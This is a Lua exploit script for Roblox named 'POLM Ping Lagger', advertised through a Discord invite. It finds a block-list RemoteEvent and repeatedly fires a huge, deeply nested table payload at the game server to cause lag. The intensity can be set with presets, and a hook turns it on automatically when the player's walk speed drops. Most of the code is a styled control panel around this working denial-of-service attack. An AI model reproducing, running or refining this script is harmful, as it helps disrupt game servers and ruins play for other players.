-- POLM Ping Lagger v1 | Blue identity · Super Low / Low / Mid / High · Auto Activate
-- Discord: https://discord.gg/5VkhQ8Dua

local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local HttpService      = game:GetService("HttpService")
local RunService       = game:GetService("RunService")
local TweenService     = game:GetService("TweenService")

local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")

-------------------------------------------------
-- BLUE THEME
-------------------------------------------------
local C = {
	bg        = Color3.fromRGB(8, 14, 28),
	panel     = Color3.fromRGB(12, 22, 42),
	card      = Color3.fromRGB(16, 30, 55),
	accent    = Color3.fromRGB(40, 140, 255),
	accentDim = Color3.fromRGB(25, 90, 180),
	accentLit = Color3.fromRGB(90, 180, 255),
	glow      = Color3.fromRGB(60, 160, 255),
	text      = Color3.fromRGB(230, 240, 255),
	muted     = Color3.fromRGB(120, 150, 190),
	on        = Color3.fromRGB(50, 220, 140),
	off       = Color3.fromRGB(220, 70, 80),
	white     = Color3.fromRGB(255, 255, 255),
	stroke    = Color3.fromRGB(40, 100, 180),
}

local DISCORD_INVITE = "https://discord.gg/5VkhQ8Dua"
local DISCORD_LABEL  = "discord.gg/5VkhQ8Dua"

-------------------------------------------------
-- CONFIG
-------------------------------------------------
local CONFIG_FILE = "POLM_PingLagger_Config.json"

local PRESETS = {
	["S.Low"] = 10000,
	Low       = 25000,
	Mid       = 50000,
	High      = 80000,
}
local PRESET_ORDER = {"S.Low", "Low", "Mid", "High"}

local DEFAULT_CFG = {
	power        = PRESETS.Mid,
	preset       = "Mid",
	interval     = 0.125,
	keybind      = "F",
	autoBrainrot = true,
}

local cfg = {
	power        = DEFAULT_CFG.power,
	preset       = DEFAULT_CFG.preset,
	interval     = DEFAULT_CFG.interval,
	keybind      = DEFAULT_CFG.keybind,
	autoBrainrot = DEFAULT_CFG.autoBrainrot,
}

local function resolveKey(name)
	if not name or name == "" or name == "None" then return nil end
	local ok, val = pcall(function() return Enum.KeyCode[name] end)
	return (ok and val) or nil
end

local function saveConfig()
	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
	if ok and encoded and writefile then
		pcall(writefile, CONFIG_FILE, encoded)
	end
end

local function loadConfig()
	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
	if not ok or type(data) ~= "table" then return end
	cfg.power        = tonumber(data.power) or DEFAULT_CFG.power
	cfg.preset       = type(data.preset) == "string" and data.preset or DEFAULT_CFG.preset
	cfg.interval     = tonumber(data.interval) or DEFAULT_CFG.interval
	cfg.keybind      = type(data.keybind) == "string" and data.keybind or DEFAULT_CFG.keybind
	cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
	if PRESETS[cfg.preset] then
		cfg.power = PRESETS[cfg.preset]
	elseif cfg.power <= 15000 then
		cfg.preset = "S.Low"; cfg.power = PRESETS["S.Low"]
	elseif cfg.power <= 30000 then
		cfg.preset = "Low"; cfg.power = PRESETS.Low
	elseif cfg.power <= 60000 then
		cfg.preset = "Mid"; cfg.power = PRESETS.Mid
	else
		cfg.preset = "High"; cfg.power = PRESETS.High
	end
end
loadConfig()

-------------------------------------------------
-- STATE
-------------------------------------------------
local active            = false
local listeningFor      = false
local remote            = nil
local lastBrainrotState = false
local uiLocked          = false
local refreshUI

local BLACKLISTED = {
	[Enum.KeyCode.Escape] = true,
	[Enum.KeyCode.LeftControl] = true,
	[Enum.KeyCode.Unknown] = true,
}

-------------------------------------------------
-- CHARACTER TITLE → Discord above head
-------------------------------------------------
local function addCharacterTitle(character)
	local head = character:WaitForChild("Head", 10)
	if not head then return end

	local old = head:FindFirstChild("POLMCharacterTitle")
	if old then old:Destroy() end

	local billboard = Instance.new("BillboardGui")
	billboard.Name = "POLMCharacterTitle"
	billboard.Adornee = head
	billboard.AlwaysOnTop = true
	billboard.LightInfluence = 0
	billboard.MaxDistance = 1200
	billboard.Size = UDim2.new(0, 280, 0, 34)
	billboard.StudsOffset = Vector3.new(0, 4.6, 0)
	billboard.Parent = head

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = DISCORD_LABEL
	label.TextColor3 = C.accent
	label.TextStrokeColor3 = Color3.fromRGB(5, 15, 35)
	label.TextStrokeTransparency = 0.15
	label.TextScaled = true
	label.Font = Enum.Font.GothamBold
	label.Parent = billboard
end

plr.CharacterAdded:Connect(addCharacterTitle)
if plr.Character then
	task.spawn(addCharacterTitle, plr.Character)
end

-------------------------------------------------
-- PING LAGGER CORE
-------------------------------------------------
local function findRemote()
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	if not rrs then return nil end
	local rem
	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
		local r = rrs:FindFirstChild(name)
		if r and r:IsA("RemoteEvent") then rem = r break end
	end
	if not rem then
		for _, c in ipairs(rrs:GetChildren()) do
			if c:IsA("RemoteEvent") and c.Name:find("Block") then rem = c break end
		end
	end
	return rem
end

remote = findRemote()

local function buildPayload(power)
	local main = {}
	local nested = {{}}
	local current = nested[1]
	for _ = 1, 186 do
		local n = {}
		table.insert(current, n)
		current = n
	end
	local maxRep = math.min(math.floor(power / 188), 10000)
	for _ = 1, maxRep do
		table.insert(main, nested)
	end
	return main
end

local loopTask = nil
local function setLag(state)
	active = state
	if active then
		if not remote or not remote.Parent then
			remote = findRemote()
		end
		if loopTask then pcall(task.cancel, loopTask) end
		local payload = buildPayload(cfg.power)
		loopTask = task.spawn(function()
			local currentDelay = cfg.interval
			while active do
				if not remote or not remote.Parent then
					remote = findRemote()
					if not remote then task.wait(0.5) continue end
				end
				local ok = pcall(function()
					remote:FireServer(payload)
				end)
				if not ok then
					currentDelay = math.min(currentDelay * 1.5, 0.5)
				else
					currentDelay = math.max(currentDelay * 0.995, 0.05)
				end
				task.wait(currentDelay)
			end
		end)
	else
		if loopTask then pcall(task.cancel, loopTask) end
		loopTask = nil
	end
end

-------------------------------------------------
-- AUTO ACTIVATE (WalkSpeed < 25)
-------------------------------------------------
RunService.Heartbeat:Connect(function()
	if not cfg.autoBrainrot then
		lastBrainrotState = false
		return
	end
	local char = plr.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end

	local hasBrainrot = hum.WalkSpeed < 25
	if hasBrainrot and not lastBrainrotState then
		lastBrainrotState = true
		if not active then
			setLag(true)
			if refreshUI then refreshUI() end
		end
	elseif not hasBrainrot and lastBrainrotState then
		lastBrainrotState = false
		if active then
			setLag(false)
			if refreshUI then refreshUI() end
		end
	end
end)

-------------------------------------------------
-- GUI HELPERS
-------------------------------------------------
local function corner(parent, r)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, r or 8)
	c.Parent = parent
	return c
end

local function stroke(parent, color, thick, trans)
	local s = Instance.new("UIStroke")
	s.Color = color or C.stroke
	s.Thickness = thick or 1.2
	s.Transparency = trans or 0.35
	s.Parent = parent
	return s
end

-------------------------------------------------
-- MAIN GUI
-------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "POLM_PingLagger"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
if not screenGui.Parent then screenGui.Parent = playerGui end

local frame = Instance.new("Frame")
frame.Name = "Main"
frame.Size = UDim2.new(0, 260, 0, 148)
frame.Position = UDim2.new(0.5, -130, 0.5, -74)
frame.BackgroundColor3 = C.bg
frame.BorderSizePixel = 0
frame.Parent = screenGui
corner(frame, 16)
stroke(frame, C.glow, 1.6, 0.3)

-- soft top accent bar
local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 3)
topBar.BackgroundColor3 = C.accent
topBar.BorderSizePixel = 0
topBar.Parent = frame
corner(topBar, 2)

-- title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -88, 0, 26)
title.Position = UDim2.new(0, 12, 0, 8)
title.BackgroundTransparency = 1
title.Text = "POLM Ping Lagger"
title.TextColor3 = C.accentLit
title.TextSize = 14
title.Font = Enum.Font.GothamBlack
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 5
title.Parent = frame

-- lock
local lockBtn = Instance.new("TextButton")
lockBtn.Size = UDim2.new(0, 24, 0, 24)
lockBtn.Position = UDim2.new(1, -60, 0, 8)
lockBtn.BackgroundColor3 = C.card
lockBtn.Text = "🔓"
lockBtn.TextColor3 = C.white
lockBtn.TextSize = 12
lockBtn.Font = Enum.Font.GothamBold
lockBtn.ZIndex = 6
lockBtn.Parent = frame
corner(lockBtn, 6)

-- settings
local gearBtn = Instance.new("TextButton")
gearBtn.Size = UDim2.new(0, 24, 0, 24)
gearBtn.Position = UDim2.new(1, -32, 0, 8)
gearBtn.BackgroundColor3 = C.accent
gearBtn.Text = "⚙"
gearBtn.TextColor3 = C.white
gearBtn.TextSize = 14
gearBtn.Font = Enum.Font.GothamBold
gearBtn.ZIndex = 6
gearBtn.Parent = frame
corner(gearBtn, 6)

-------------------------------------------------
-- PLAY MODE: ACTIVATE + PRESETS
-------------------------------------------------
local lagBtn = Instance.new("TextButton")
lagBtn.Name = "ActivateBtn"
lagBtn.Size = UDim2.new(0, 230, 0, 38)
lagBtn.Position = UDim2.new(0.5, -115, 0, 40)
lagBtn.BackgroundColor3 = C.accentDim
lagBtn.BorderSizePixel = 0
lagBtn.Text = "ACTIVATE"
lagBtn.TextColor3 = C.off
lagBtn.TextSize = 16
lagBtn.Font = Enum.Font.GothamBlack
lagBtn.ZIndex = 5
lagBtn.Parent = frame
corner(lagBtn, 10)
stroke(lagBtn, C.glow, 1.3, 0.35)

local presetRow = Instance.new("Frame")
presetRow.Name = "PresetRow"
presetRow.Size = UDim2.new(0, 230, 0, 30)
presetRow.Position = UDim2.new(0.5, -115, 0, 88)
presetRow.BackgroundTransparency = 1
presetRow.ZIndex = 5
presetRow.Parent = frame

local presetLayout = Instance.new("UIListLayout")
presetLayout.FillDirection = Enum.FillDirection.Horizontal
presetLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
presetLayout.Padding = UDim.new(0, 5)
presetLayout.SortOrder = Enum.SortOrder.LayoutOrder
presetLayout.Parent = presetRow

local presetButtons = {}

local function updatePresetVisuals()
	for name, btn in pairs(presetButtons) do
		local selected = (cfg.preset == name)
		btn.BackgroundColor3 = selected and C.accent or C.card
		btn.TextColor3 = selected and C.white or C.muted
		local s = btn:FindFirstChildOfClass("UIStroke")
		if s then
			s.Transparency = selected and 0.2 or 0.55
			s.Color = selected and C.glow or C.stroke
		end
	end
end

local function setPreset(name)
	if not PRESETS[name] then return end
	cfg.preset = name
	cfg.power = PRESETS[name]
	if active then
		setLag(false)
		setLag(true)
	end
	saveConfig()
	updatePresetVisuals()
	if refreshUI then refreshUI() end
end

for i, name in ipairs(PRESET_ORDER) do
	local btn = Instance.new("TextButton")
	btn.Name = "Preset_" .. name
	btn.Size = UDim2.new(0, 52, 0, 28)
	btn.BackgroundColor3 = C.card
	btn.BorderSizePixel = 0
	btn.Text = name
	btn.TextColor3 = C.muted
	btn.TextSize = 11
	btn.Font = Enum.Font.GothamBold
	btn.LayoutOrder = i
	btn.ZIndex = 6
	btn.Parent = presetRow
	corner(btn, 7)
	stroke(btn, C.stroke, 1.1, 0.55)
	btn.MouseButton1Click:Connect(function()
		setPreset(name)
	end)
	presetButtons[name] = btn
end
updatePresetVisuals()

-- discord copy under presets
local discBtn = Instance.new("TextButton")
discBtn.Size = UDim2.new(0, 230, 0, 18)
discBtn.Position = UDim2.new(0.5, -115, 0, 122)
discBtn.BackgroundTransparency = 1
discBtn.Text = DISCORD_LABEL
discBtn.TextColor3 = C.muted
discBtn.TextSize = 11
discBtn.Font = Enum.Font.Gotham
discBtn.ZIndex = 5
discBtn.Parent = frame
discBtn.MouseButton1Click:Connect(function()
	pcall(function()
		if setclipboard then setclipboard(DISCORD_INVITE) end
	end)
end)

-------------------------------------------------
-- SETTINGS PANEL
-------------------------------------------------
local settingsPanel = Instance.new("Frame")
settingsPanel.Name = "SettingsPanel"
settingsPanel.Size = UDim2.new(1, -20, 0, 110)
settingsPanel.Position = UDim2.new(0, 10, 0, 36)
settingsPanel.BackgroundTransparency = 1
settingsPanel.Visible = false
settingsPanel.ZIndex = 8
settingsPanel.Parent = frame

local function makeLbl(text, x, y)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(0, 56, 0, 14)
	lbl.Position = UDim2.new(0, x, 0, y or 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = text
	lbl.TextColor3 = C.muted
	lbl.TextSize = 11
	lbl.Font = Enum.Font.Gotham
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.ZIndex = 8
	lbl.Parent = settingsPanel
	return lbl
end

local function makeBox(x, y, w)
	local box = Instance.new("TextBox")
	box.Size = UDim2.new(0, w or 70, 0, 24)
	box.Position = UDim2.new(0, x, 0, y)
	box.BackgroundColor3 = C.card
	box.TextColor3 = C.text
	box.PlaceholderColor3 = C.muted
	box.TextSize = 12
	box.Font = Enum.Font.GothamBold
	box.ClearTextOnFocus = false
	box.ZIndex = 8
	box.Parent = settingsPanel
	corner(box, 6)
	stroke(box, C.stroke, 1, 0.4)
	return box
end

makeLbl("power", 0, 2)
local powerBox = makeBox(0, 18, 72)
powerBox.Text = tostring(cfg.power)

makeLbl("delay", 84, 2)
local intervalBox = makeBox(84, 18, 64)
intervalBox.Text = tostring(tonumber(string.format("%.3f", cfg.interval)))

makeLbl("key", 160, 2)
local keybindBtn = Instance.new("TextButton")
keybindBtn.Size = UDim2.new(0, 48, 0, 24)
keybindBtn.Position = UDim2.new(0, 160, 0, 18)
keybindBtn.BackgroundColor3 = C.card
keybindBtn.Text = cfg.keybind
keybindBtn.TextColor3 = C.text
keybindBtn.TextSize = 12
keybindBtn.Font = Enum.Font.GothamBold
keybindBtn.ZIndex = 8
keybindBtn.Parent = settingsPanel
corner(keybindBtn, 6)
stroke(keybindBtn, C.stroke, 1, 0.4)

makeLbl("Auto Act", 0, 50)
local toggleTrack = Instance.new("Frame")
toggleTrack.Size = UDim2.new(0, 42, 0, 20)
toggleTrack.Position = UDim2.new(0, 70, 0, 50)
toggleTrack.BackgroundColor3 = cfg.autoBrainrot and C.accent or C.card
toggleTrack.BorderSizePixel = 0
toggleTrack.ZIndex = 8
toggleTrack.Parent = settingsPanel
corner(toggleTrack, 10)

local toggleKnob = Instance.new("Frame")
toggleKnob.Size = UDim2.new(0, 16, 0, 16)
toggleKnob.Position = cfg.autoBrainrot and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
toggleKnob.BackgroundColor3 = C.white
toggleKnob.BorderSizePixel = 0
toggleKnob.ZIndex = 9
toggleKnob.Parent = toggleTrack
corner(toggleKnob, 8)

local toggleHit = Instance.new("TextButton")
toggleHit.Size = UDim2.new(1, 0, 1, 0)
toggleHit.BackgroundTransparency = 1
toggleHit.Text = ""
toggleHit.ZIndex = 10
toggleHit.Parent = toggleTrack

local copyDisc = Instance.new("TextButton")
copyDisc.Size = UDim2.new(0, 120, 0, 26)
copyDisc.Position = UDim2.new(0, 130, 0, 48)
copyDisc.BackgroundColor3 = C.accent
copyDisc.Text = "Copy Discord"
copyDisc.TextColor3 = C.white
copyDisc.TextSize = 11
copyDisc.Font = Enum.Font.GothamBold
copyDisc.ZIndex = 8
copyDisc.Parent = settingsPanel
corner(copyDisc, 7)
copyDisc.MouseButton1Click:Connect(function()
	pcall(function()
		if setclipboard then setclipboard(DISCORD_INVITE) end
	end)
end)

-- floating reopen chip
local chip = Instance.new("TextButton")
chip.Name = "Chip"
chip.Size = UDim2.new(0, 72, 0, 28)
chip.Position = UDim2.new(0, 14, 0.5, -14)
chip.BackgroundColor3 = C.accent
chip.Text = "POLM"
chip.TextColor3 = C.white
chip.Font = Enum.Font.GothamBlack
chip.TextSize = 12
chip.Visible = false
chip.ZIndex = 20
chip.Parent = screenGui
corner(chip, 8)
stroke(chip, C.glow, 1.2, 0.4)

local settingsOpen = false
local currentW, currentH = 260, 148

-------------------------------------------------
-- DRAG
-------------------------------------------------
local function makeDraggable(target, lockedCheck)
	local dragging, dragStart, startAbs
	target.InputBegan:Connect(function(input)
		if lockedCheck and lockedCheck() then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startAbs = target.AbsolutePosition
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if not dragging then return end
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			local delta = input.Position - dragStart
			local vp = workspace.CurrentCamera.ViewportSize
			local nx = math.clamp(startAbs.X + delta.X, -target.AbsoluteSize.X + 40, vp.X - 40)
			local ny = math.clamp(startAbs.Y + delta.Y, 0, vp.Y - target.AbsoluteSize.Y)
			target.Position = UDim2.new(0, nx, 0, ny)
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
		end
	end)
end

makeDraggable(frame, function() return uiLocked end)
makeDraggable(chip)

-------------------------------------------------
-- UI LOGIC
-------------------------------------------------
local function updateToggleVisual()
	local goalPos = cfg.autoBrainrot and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
	local goalColor = cfg.autoBrainrot and C.accent or C.card
	TweenService:Create(toggleKnob, TweenInfo.new(0.16), {Position = goalPos}):Play()
	TweenService:Create(toggleTrack, TweenInfo.new(0.16), {BackgroundColor3 = goalColor}):Play()
end

refreshUI = function()
	powerBox.Text = tostring(cfg.power)
	intervalBox.Text = tostring(tonumber(string.format("%.3f", cfg.interval)))
	keybindBtn.Text = listeningFor and "..." or cfg.keybind
	updateToggleVisual()
	lockBtn.Text = uiLocked and "🔒" or "🔓"
	lagBtn.Text = active and "DEACTIVATE" or "ACTIVATE"
	lagBtn.TextColor3 = active and C.on or C.off
	lagBtn.BackgroundColor3 = active and Color3.fromRGB(20, 60, 40) or C.accentDim
	updatePresetVisuals()
end

powerBox.FocusLost:Connect(function()
	local num = tonumber(powerBox.Text)
	if num and num >= 1 then
		cfg.power = math.floor(num)
		if cfg.power <= 15000 then cfg.preset = "S.Low"
		elseif cfg.power <= 30000 then cfg.preset = "Low"
		elseif cfg.power <= 60000 then cfg.preset = "Mid"
		else cfg.preset = "High" end
		saveConfig()
		if active then setLag(false); setLag(true) end
	end
	refreshUI()
end)

intervalBox.FocusLost:Connect(function()
	local num = tonumber(intervalBox.Text)
	if num and num >= 0.01 then
		cfg.interval = num
		saveConfig()
	end
	refreshUI()
end)

keybindBtn.MouseButton1Click:Connect(function()
	listeningFor = true
	refreshUI()
end)

toggleHit.MouseButton1Click:Connect(function()
	cfg.autoBrainrot = not cfg.autoBrainrot
	saveConfig()
	refreshUI()
end)

lagBtn.MouseButton1Click:Connect(function()
	active = not active
	setLag(active)
	refreshUI()
end)

lockBtn.MouseButton1Click:Connect(function()
	uiLocked = not uiLocked
	refreshUI()
end)

gearBtn.MouseButton1Click:Connect(function()
	settingsOpen = not settingsOpen
	settingsPanel.Visible = settingsOpen
	lagBtn.Visible = not settingsOpen
	presetRow.Visible = not settingsOpen
	discBtn.Visible = not settingsOpen

	local targetSize = settingsOpen and UDim2.new(0, 280, 0, 160) or UDim2.new(0, currentW, 0, currentH)
	local targetPos = settingsOpen
		and UDim2.new(0.5, -140, 0.5, -80)
		or UDim2.new(0.5, -currentW / 2, 0.5, -currentH / 2)
	TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
		Size = targetSize,
		Position = targetPos,
	}):Play()
end)

UserInputService.InputBegan:Connect(function(input, processed)
	local kc = input.KeyCode
	if kc == Enum.KeyCode.Unknown then return end
	if listeningFor then
		if kc == Enum.KeyCode.Escape then
			listeningFor = false
			refreshUI()
			return
		end
		if not BLACKLISTED[kc] then
			cfg.keybind = kc.Name
			listeningFor = false
			saveConfig()
			refreshUI()
		end
		return
	end
	if processed then return end
	local keyEnum = resolveKey(cfg.keybind)
	if keyEnum and kc == keyEnum then
		active = not active
		setLag(active)
		refreshUI()
	end
end)

refreshUI()
print("[POLM Ping Lagger] loaded · Super Low 10k · Blue theme · " .. DISCORD_LABEL)
